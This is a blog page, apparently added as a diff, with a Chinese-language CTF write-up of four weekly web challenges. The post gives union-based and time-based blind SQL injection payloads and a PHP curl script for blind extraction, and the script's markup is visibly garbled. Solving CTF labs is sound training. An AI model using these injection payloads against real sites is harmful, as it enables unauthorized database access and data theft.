@@ -1,0 +1,447 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-nnn">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.0"/>
+
+
+    <meta name="description" content="Blog" />
+
+
+
+
+    <meta name="keywords" content="Hexo,next" />
+
+
+
+    <link rel="alternate" href="/atom.xml" title="Hc1m1" type="application/atom+xml" />
+
+
+
+    <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.0" />
+
+
+
+
+  <title>
+  writeup // Hc1m1
+</title>
+</head>
+
+<body>
+  <div class="container one-column ">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Hc1m1</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+
+  <ul id="menu" class="menu">
+    
+      
+      <li class="menu-item menu-item-home">
+        <a href="/">
+          <i class="menu-item-icon icon-home"></i> <br />
+          首页
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-categories">
+        <a href="/categories">
+          <i class="menu-item-icon icon-categories"></i> <br />
+          分类
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-archives">
+        <a href="/archives">
+          <i class="menu-item-icon icon-archives"></i> <br />
+          归档
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-tags">
+        <a href="/tags">
+          <i class="menu-item-icon icon-tags"></i> <br />
+          标签
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-about">
+        <a href="/about">
+          <i class="menu-item-icon icon-about"></i> <br />
+          关于
+        </a>
+      </li>
+    
+  </ul>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+            
+          
+
+          <div id="posts" class="posts-collapse">
+            
+
+  
+  
+    <p><strong>题做多了果然有经验了，5小时AC了这周的四题</strong><br>拿了两题的一血～～～</p>
+<a id="more"></a>
+<p>=================================================write time : 7/2 23:00</p>
+<h2 id="0x6_做不出来不要玩CTF系列之二(Rank:50)">0x6 做不出来不要玩CTF系列之二(Rank:50)</h2><blockquote>
+<p>题目链接：<a href="http://104.236.171.163/week3/web50/" target="_blank" rel="external">http://104.236.171.163/week3/web50/</a></p>
+</blockquote>
+<p>//这题算是简单的题目了。。不难，也没什么脑洞之类的。。</p>
+<p>这题的flag分为三部分，我最先搞出来的是flag3。。点击<br><a href="http://104.236.171.163/week3/web50/gogogo.php" target="_blank" rel="external">点我寻址flag</a><br>后查看源码，，看到那一串东西，很眼熟，在 <a href="http://drops.hduisa.cn/page/9/" target="_blank" rel="external">drops</a>里看到过，记得是 <code>XSS的Game&amp;&amp;Write-up</code> 中的第一个 <a href="http://escape.alf.nu/" target="_blank" rel="external">Escape</a> XSS练习中的一题出现过，，截取这串东西的前面一部分，百度，第一个页面。。。</p>
+<p>Get Flag3～</p>
+<p>然后就是flag1，回到开始的界面，F12 —&gt; 网络 —&gt; 响应头信息</p>
+<p>Get Flag1～</p>
+<p>接下来就差flag2了，，点击<br><a href="http://104.236.171.163/week3/web50/gogogo.php" target="_blank" rel="external">点我寻址flag</a><br>跳转的时候按 <code>ESC</code> 然后查看页面源码。<br>PS：如果实在手速慢，可以用wireshark抓包，或者burp也行。。。</p>
+<p>Get Flag2～</p>
+<p>然后三个flag组合起来得到最终 Flag ～～</p>
+<h2 id="0x7_SQLi系列之一(Rank:200)">0x7 SQLi系列之一(Rank:200)</h2><blockquote>
+<p>题目链接：<a href="http://104.236.171.163/week3/blindsqli/" target="_blank" rel="external">http://104.236.171.163/week3/blindsqli/</a></p>
+</blockquote>
+<p>//这周的难题之一，我能这么快做出来是因为这题目和上次提到的 <a href="#">安全科普：SQLi Labs 指南</a>里的好像。。。</p>
+<p>根据提示，这题是手注，过滤了 <code>or</code> 和 <code>and</code> 然后打开题目，得到两个信息，是在 <code>id</code> 后面进行注入和 Flag 应该就在当前数据库的 flag表中，然后开始尝试注入。。。。。</p>
+<p>然后发现用双引号会报错 ，猜测源码是<br><code>select * from xx where id=&quot;$id&quot;</code></p>
+<p>接着根据在 <a href="#">安全科普：SQLi Labs 指南</a>中学到的，试着用 <code>union</code> 注入，发现 payload：<code>?id=0&quot; union select 1,2,3 --+</code>成功。。。</p>
+<p>然后猜测Flag在flag表中的字段名为flag，于是构造payload：<code>?id=0&quot; union select 1,flag,3 from flag --+</code> </p>
+<p>Get Flag～</p>
+<h1 id="0x8_SQLi系列之二(Rank:200)">0x8 SQLi系列之二(Rank:200)</h1><blockquote>
+<p>题目链接：<a href="http://104.236.171.163/week3/blindsqli2/" target="_blank" rel="external">http://104.236.171.163/week3/blindsqli2/</a></p>
+</blockquote>
+<p>//界面和上一题一样，，不过我觉得比上一题难，可是Rank分还是200.。。。。。</p>
+<p>PS：这题也许有简单的方法，，不过我没发现，，用的是笨方法，上一周的基于时间的盲注。。</p>
+<p>跟上题差不多的思路，先用上一题的payload测试一下，发现报错，<code>select 1</code>、<code>select 1,2</code>、<code>select 1,2,3,4</code> 等等都试了没用，，猜测是<code>union</code>过滤了，接着又试了 <code>?id=0&quot; or 1--+</code> 和 <code>?id=0&quot; and 1 --+</code>，成功，说明 <code>or</code> 和 <code>and</code> 都没过滤，然后试 <code>ord()</code> 、<code>mid()</code>都没用，然后想起上次看到的两个函数 <code>ascii()</code> 和 <code>substr()</code> 结果发现行，然后就用 <code>ascii()</code>替代 <code>ord()</code>、<code>substr()</code>替代 <code>mid()</code> 构造payload：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1" and (<span class="operator"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">96</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">3</span>))) <span class="comment">--+</span></span><br><span class="line"><span class="string">``</span><span class="string">` </span><br><span class="line">得出当前数据库flag表flag字段名下的数据第一个字符为 ‘h’，然后就知道方向没错了，又注出来接下来的是 ‘hctf&#123;’，然后就开始写脚本注入后面的数据了。。。</span><br><span class="line"></span><br><span class="line">下面为我用php写的脚本，跟上一周那题的没差～</span></span></span><br></pre></td></tr></table></figure></p>
+<p>&lt;?php<br>for($i=96;$i<123;$i++){ $login_url="http://104.236.171.163/week3/blindsqli2/?id=1" and (select if(ascii(substr((select flag from flag),1,1)) > " .$i.',1,sleep(3)))="" --+';="" $ch="curl_init($login_url);" curl_setopt($ch,="" curlopt_returntransfer,1);="" $stime="microtime(true);" $arr="curl_exec($ch);" $etime="microtime(true);" curl_close($ch);="" $total="$etime-$stime;" echo="">";
+        if($total>3){<br>            echo chr($i);<br>            $i = 58;<br>        }<br>}<br>?&gt;<br>```<br>用脚本盲注的思路和上一周的基本一致。。然后。</123;$i++){></p>
+<p>Get Flag～</p>
+<p>PS：看着我写的这么迟钝的脚本，，激起了我好好学py的决心～～</p>
+<h2 id="0x9_做不出来不要玩CTF系列之三(Rank:20)">0x9 做不出来不要玩CTF系列之三(Rank:20)</h2><p>//这周题目多了一题，有四题，真棒～～</p>
+<p>这题是我觉得这周最坑的题，，，，（/捂脸。。好吧，我承认是我自己想太多了）。。。我竟然往注入方向想了。。浪费了我那么长时间。。</p>
+<p>这么没技术。。也没难度。。。就是让你试着 <code>id=1</code> 、<code>id=2</code>这样一个一个试下去。。。就出来了。。。</p>
+<p>Get Flag！</p>
+<p>======================================PS:写在最后<br><strong>果然题目做多了。思路就开阔了。。。坚持学下去。。就一定会有收获～～</strong></p>
+
+  
+
+
+          </div>
+
+          
+        </div>
+
+        
+<div class="sidebar-toggle">
+  <div class="sidebar-toggle-line-wrap">
+    <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+    <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+    <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+  </div>
+</div>
+
+<div id="sidebar" class="sidebar">
+  <div class="sidebar-inner">
+
+    
+
+    <div class="site-overview">
+      <div class="site-author motion-element">
+        <img class="site-author-image" src="/images/default_avatar.jpg" alt="Hc1m1" />
+        <p class="site-author-name">Hc1m1</p>
+      </div>
+      <p class="site-description motion-element">Blog</p>
+      <div class="site-state motion-element">
+        <div class="site-state-item site-state-posts">
+          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-name">日志</span>
+        </div>
+        <div class="site-state-item site-state-tags">
+            <span class="site-state-item-count">20</span>
+            <span class="site-state-item-name">标签</span>
+        </div>
+        <div class="site-state-item site-state-pages">
+            <span class="site-state-item-count">8</span>
+            <span class="site-state-item-name">页面</span>
+        </div>
+      </div>
+
+      
+        <div class="feed-link motion-element">
+          <a href="/atom.xml">
+            <i class="menu-item-icon icon-feed"></i>
+            RSS
+          </a>
+        </div>
+      
+
+      <div class="links-of-author motion-element">
+        
+      </div>
+
+      
+      
+
+    </div>
+
+    
+
+  </div>
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp; 
+  2015
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Hc1m1</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript">
+    $(document).ready(function() {
+      $(".fancybox").fancybox();
+    });
+  </script>
+
+  <script type="text/javascript">
+  function hasMobileUA () {
+    var nav = window.navigator;
+    var ua = nav.userAgent;
+    var pa = /iPad|iPhone|Android|Opera Mini|BlackBerry|webOS|UCWEB|Blazer|PSP|IEMobile|Symbian/g;
+
+    return pa.test(ua);
+  }
+
+  function isDesktop () {
+    return screen.width > 991 && !hasMobileUA();
+  }
+
+  function isTablet () {
+    return screen.width < 992 && screen.width > 767 && hasMobileUA();
+  }
+
+  function isMobile () {
+    return screen.width < 767 && hasMobileUA();
+  }
+
+  function escapeSelector (selector) {
+    return selector.replace(/[!"$%&'()*+,.\/:;<=>?@[\\\]^`{|}~]/g, "\\$&")
+  }
+</script>
+
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" id="motion.global">
+  $(document).ready(function () {
+    var body = $('body');
+    var isSidebarVisible = false;
+    var sidebarToggle = $('.sidebar-toggle');
+    var sidebarToggleLine1st = $('.sidebar-toggle-line-first')
+    var sidebarToggleLine2nd = $('.sidebar-toggle-line-middle');
+    var sidebarToggleLine3rd = $('.sidebar-toggle-line-last');
+    var sidebar = $('.sidebar');
+
+    var SIDEBAR_WIDTH = '320px';
+    var SIDEBAR_DISPLAY_DURATION = 300;
+
+    var sidebarToogleLineStatusInit = {width: '100%', opacity: 1, left: 0, rotateZ: 0, top: 0};
+
+    var sidebarToggleLine1stStatusInit = sidebarToogleLineStatusInit;
+    var sidebarToggleLine1stStatusArrow = {width: '50%', rotateZ: '-45deg', top: '2px'};
+    var sidebarToogleLine1stStatusClose = {width: '100%', rotateZ: '-45deg', top: '5px'};
+
+    var sidebarToggleLine2ndStatusInit = sidebarToogleLineStatusInit;
+    var sidebarToggleLine2ndStatusArrow = {width: '90%'};
+    var sidebarToogleLine2ndStatusClose = {opacity: 0};
+
+    var sidebarToggleLine3rdStatusInit = sidebarToogleLineStatusInit;
+    var sidebarToggleLine3rdStatusArrow = {width: '50%', rotateZ: '45deg', top: '-2px'};
+    var sidebarToogleLine3rdStatusClose = {width: '100%', rotateZ: '45deg', top: '-5px'};
+
+    LogoAndMenuMotion();
+    sidebatToggleMotion();
+    postsListMotion();
+    backToTopMotion();
+
+
+    $(document)
+      .on('sidebar.isShowing', function () {
+        isDesktop() && body.velocity(
+          {paddingRight: SIDEBAR_WIDTH},
+          SIDEBAR_DISPLAY_DURATION
+        );
+        sidebarContentMotion();
+      })
+      .on('sidebar.isHiding', function () {});
+
+    function LogoAndMenuMotion() {
+      $.Velocity.RunSequence([
+        { e: $('.brand'), p: { opacity: 1 }, o: { duration: 100 } },
+        { e: $('.logo'), p: { opacity: 1, top: 0 }, o: { duration: 50} },
+        
+        { e: $('.logo-line-before i'), p: { translateX: "100%" }, o: { duration: 500, sequenceQueue: false } },
+        { e: $('.logo-line-after i'), p: { translateX: "-100%" }, o: { duration: 500, sequenceQueue: false } },
+        
+        { e: $('.site-title'), p: { opacity: 1, top: 0 }, o: { duration: 200 } }
+      ]);
+      $('.menu-item').velocity('transition.slideDownIn', {display: null});
+    }
+
+
+    function backToTopMotion () {
+      var b2top = $('.back-to-top');
+      b2top.on('click', function () {
+        body.velocity('scroll');
+      });
+    }
+
+    function sidebarShowMotion () {
+
+      sidebarToggleLine1st.velocity(sidebarToogleLine1stStatusClose);
+      sidebarToggleLine2nd.velocity(sidebarToogleLine2ndStatusClose);
+      sidebarToggleLine3rd.velocity(sidebarToogleLine3rdStatusClose);
+
+      sidebar.velocity({width: SIDEBAR_WIDTH}, {
+        display: 'block',
+        duration: SIDEBAR_DISPLAY_DURATION,
+        complete: function () {
+          sidebar.addClass('sidebar-active');
+          sidebar.trigger('sidebar.didShow');
+        }
+      });
+      sidebar.trigger('sidebar.isShowing');
+    }
+
+    function sidebarHideMotion () {
+      isDesktop() && body.velocity({paddingRight: 0});
+      sidebar.velocity('reverse');
+
+      sidebarToggleLine1st.velocity(sidebarToggleLine1stStatusInit);
+      sidebarToggleLine2nd.velocity(sidebarToggleLine2ndStatusInit);
+      sidebarToggleLine3rd.velocity(sidebarToggleLine3rdStatusInit);
+
+      sidebar.removeClass('sidebar-active');
+      sidebar.trigger('sidebar.isHiding');
+    };
+
+    function sidebarContentMotion () {
+      $('.sidebar .motion-element').velocity(
+        'transition.slideRightIn',
+        {stagger: 50, drag: true}
+      );
+    }
+
+    function postsListMotion () {
+      var postMotionOptions = window.postMotionOptions || {stagger: 300, drag: true};
+      $('.post').velocity('transition.slideDownIn', postMotionOptions);
+    }
+
+    function sidebatToggleMotion () {
+      sidebarToggle.on('click', function () {
+        isSidebarVisible ? sidebarHideMotion() : sidebarShowMotion();
+        isSidebarVisible = !isSidebarVisible;
+      });
+
+      sidebarToggle.hover(function () {
+        if (isSidebarVisible) {return}
+        sidebarToggleLine1st.velocity('stop').velocity(sidebarToggleLine1stStatusArrow);
+        sidebarToggleLine2nd.velocity('stop').velocity(sidebarToggleLine2ndStatusArrow);
+        sidebarToggleLine3rd.velocity('stop').velocity(sidebarToggleLine3rdStatusArrow);
+      }, function () {
+        if (isSidebarVisible) {return}
+        sidebarToggleLine1st.velocity('stop').velocity(sidebarToggleLine1stStatusInit);
+        sidebarToggleLine2nd.velocity('stop').velocity(sidebarToggleLine2ndStatusInit);
+        sidebarToggleLine3rd.velocity('stop').velocity(sidebarToggleLine3rdStatusInit);
+      });
+    }
+  });
+
+</script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+
+  
+</body>
+</html>
